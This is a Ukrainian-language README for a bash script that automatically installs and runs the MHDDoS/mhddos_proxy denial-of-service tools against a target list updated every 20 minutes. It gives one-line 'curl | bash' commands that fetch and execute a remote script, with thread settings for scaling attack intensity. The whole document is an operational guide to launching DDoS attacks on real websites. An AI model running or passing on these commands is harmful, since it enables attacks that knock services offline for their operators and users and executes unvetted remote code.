## ❕Опис

### mhddos_bash - скрипт на bash, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)

* Запускається однією командою в Linux і WSL2 (Windows Subsystem for Linux). Подальше втручання від користувача не обов'язкове. 
 
```
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/auto_bash.sh | bash
```
* Автоматично встановлює git, python3, pip, mhddos_proxy, MHDDoS, розширений список proxy і всі залежності.

* Праюцює із базою сайтів [Українського женця](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).

* База цілей оновлюється кожні 20 хвилин.

* Під час запуску завжди перевіряє і завантажує оновлення mhddos_proxy і MHDDoS.

Рекомендовано використовувати на Ubuntu 20.04. Але повинно працювати на всіх Ubuntu та Debian похідних, а також у WSL2.

Для зупинки скрипта кілька разів натисніть CTRL+C, або закрийте вікно з терміналом.

## ❕Зміна інтенсивності

Якщо скрипт дуже уповільнює ПК, або навпаки ви маєте невикористані ресурси, можна понизити, або навпаки підвищіти інтенсивність роботи скрипта. Для цього треба керувати параметром `threads`. По замовчуванню `threads = 1000`.

Щоб знизити навантаження на систему, спробуйте використати `threads = 500`

```
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/auto_bash.sh | bash -s -- 500
```

Щоб навантажити систему більше, спробуйте використати `threads = 2000`

```
curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/auto_bash.sh | bash -s -- 2000
```
